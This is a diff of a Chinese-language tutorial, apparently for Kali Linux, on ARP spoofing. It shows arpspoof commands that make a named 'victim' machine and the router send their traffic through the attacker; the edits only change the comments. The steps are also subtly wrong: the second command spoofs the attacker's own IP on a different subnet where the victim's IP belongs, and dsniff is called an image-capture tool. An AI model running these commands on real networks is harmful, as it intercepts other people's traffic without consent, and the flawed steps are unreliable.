@@ -77,13 +77,13 @@ Nmap done: 256 IP addresses (8 hosts up) scanned in 102.69 seconds
 
 打开一个控制台
 ```shell script
-root@kali:~# apt-get install dsniff
-root@kali:~# arpspoof -i eth0 -t 192.168.0.103(受害者ip) 192.168.0.1(路由器ip)   #告诉192.168.0.103(受害者ip),我是路由器
+root@kali:~# apt-get install dsniff  #安装图片抓取工具
+root@kali:~# arpspoof -i eth0 -t 192.168.0.103(受害者ip) 192.168.0.1(路由器ip,也就是你的网关)   #告诉192.168.0.103(受害者ip),我是路由器
 ```
 
 我们再打开一个控制台：
 ```shell script
-root@kali:~# arpspoof -i eth0 -t 192.168.0.1(路由器ip) 192.168.1.101(我的ip)    #告诉路由器,我的ip是(受害者)
+root@kali:~# arpspoof -i eth0 -t 192.168.0.1(路由器ip,也就是你的网关) 192.168.1.101(我的ip)    #告诉路由器,我的ip是(受害者)
 ``` 
 
 我们再打开一个控制台：
